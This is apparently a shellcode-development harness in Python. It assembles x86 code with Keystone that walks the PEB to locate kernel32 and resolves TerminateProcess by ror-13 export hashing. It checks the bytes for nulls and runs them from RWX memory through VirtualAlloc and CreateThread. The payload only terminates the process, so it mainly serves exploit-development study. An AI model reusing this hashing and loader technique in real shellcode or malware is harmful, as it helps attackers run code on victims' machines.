import ctypes, struct
from keystone import *
CODE = """
start:
    # debug instruction
	# int3
	mov ebp, esp
	add esp, 0xfffffdf0 
find_kernel32:
    xor ecx, ecx          # ECX = 0
    mov esi,fs:[ecx+30h]  # ESI = &(PEB) ([FS:0x30])
    mov esi,[esi+0Ch]     # ESI = PEB->Ldr
    mov esi,[esi+1Ch]     # ESI = PEB->Ldr.InInitOrder
next_module:
    mov ebx, [esi+8h]     # EBX = InInitOrder[X].base_address
    mov edi, [esi+20h]    # EDI = InInitOrder[X].module_name
    mov esi, [esi]        # ESI = InInitOrder[X].flink (next)
    cmp [edi+12*2], cx    # (unicode) modulename[12] == 0x00?
    jne next_module       # No: try next module.
find_function_shorten: 
    jmp find_function_shorten_bnc   # short jump, to make negative call later

find_function_ret:
    pop esi                         # POP the return address from the stack
    mov [ebp+0x04], esi             # Save find_function address for later
    jmp resolve_symbols_kernel32

find_function_shorten_bnc:
    call find_function_ret

find_function:
	pushad                          # save all registers to stack
	mov eax, [ebx+0x3c]
	mov edi, [ebx+eax+0x78]
	add edi, ebx
	mov ecx, [edi+0x18]
	mov eax, [edi+0x20]
	add eax, ebx
	mov [ebp-4], eax

find_function_loop:
	jecxz find_function_finished
	dec ecx
	mov eax, [ebp-4]
	mov esi, [eax+ecx*4]
	add esi, ebx

compute_hash:
	xor eax, eax
	cdq
	cld

compute_hash_again:
	lodsb
	test al, al
	jz compute_hash_finished
	ror edx, 0x0d
	add edx, eax
	jmp compute_hash_again

compute_hash_finished:

find_function_compare:
	cmp edx, [esp+0x24]
	jnz find_function_loop
	mov edx, [edi+0x24]
	add edx, ebx
	mov cx, [edx+2*ecx]
	mov edx, [edi+0x1c]
	add edx, ebx
	mov eax, [edx+4*ecx]
	add eax, ebx
	mov [esp+0x1c], eax

find_function_finished:
	popad
	ret

resolve_symbols_kernel32: 
	push 0x78b5b983             # TerminateProcess hash
    call dword ptr [ebp+0x04]   # Call find_function
    mov [ebp+0x10], eax         # Save TerminateProcess address for

exec_shellcode:
	xor ecx, ecx
	push ecx                    # uExitCode
	push 0xffffffff             # hProcess
	call dword ptr [ebp+0x10]   # call TerminateProcess
"""
# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)

# try to compile assembly if not, try to compile each line separetely
try:
    encoding, count = ks.asm(CODE)
except keystone.KsError:
    # Split the assembly code into lines and assemble each line separately
    lines = CODE.strip().split('\n')
    for i, line in enumerate(lines, start=1):
        try:
            encoding, count = ks.asm(line)
            # print(f"Line {i}: {line} - Assembled successfully: {encoding}")
        except KsError as e:
            print(f"Error on line {i}: {line}")
            print("Error Message:", e)
    exit()

# search for bad characters in shellcode
bad_characters = ["00"]
for bc in bad_characters:
    if bc in " ".join([f"{byte:02x}" for byte in encoding]):
        print("Bad chars!")
        print(" ".join([f"{byte:02x}" for byte in encoding]))
        print("Bad chars!")

print("Encoded %d instructions..." % count)
sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)
shellcode = bytearray(sh)
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),
ctypes.c_int(ptr),
ctypes.c_int(0),
ctypes.c_int(0),
ctypes.pointer(ctypes.c_int(0)))
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))